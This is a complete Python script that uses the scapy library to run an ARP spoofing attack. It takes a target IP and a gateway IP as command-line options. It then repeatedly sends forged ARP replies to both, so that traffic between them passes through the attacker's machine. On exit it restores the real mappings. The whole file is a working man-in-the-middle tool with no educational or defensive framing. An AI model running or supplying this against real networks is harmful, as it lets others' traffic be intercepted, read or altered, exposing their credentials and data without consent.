import scapy.all as scapy
import  time
import optparse


def get_mac_address(ip):
    arp_request=scapy.ARP(pdst=ip)
    brodcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet=brodcast_packet/arp_request
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    print(answered_list[0][0])
    return answered_list[0][0].hwsrc

def arp_poisoning(target_ip,poison_ip):
    target_mac=get_mac_address(target_ip)
    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poison_ip)
    #scapy.ls(scapy.ARP())
    scapy.send(arp_response,verbose=False)

def  reset_operation(fooled_ip,gateway_ip):
    fooled_mac=get_mac_address(fooled_ip)
    gateway_mac=get_mac_address(gateway_ip)
    arp_response=scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response , verbose=False , count=6)

def get_user_input():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="enter target ip")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="enter gateway ip")
    user_input=parse_object.parse_args()[0]

    return user_input

packet=0
user_ips=get_user_input()
if not user_ips.target_ip or not user_ips.gateway_ip:
    print("please enter target_ip and gateway_ip")
    exit()
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        packet+=2
        print("\rsending packets" + str(packet),end=" ")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)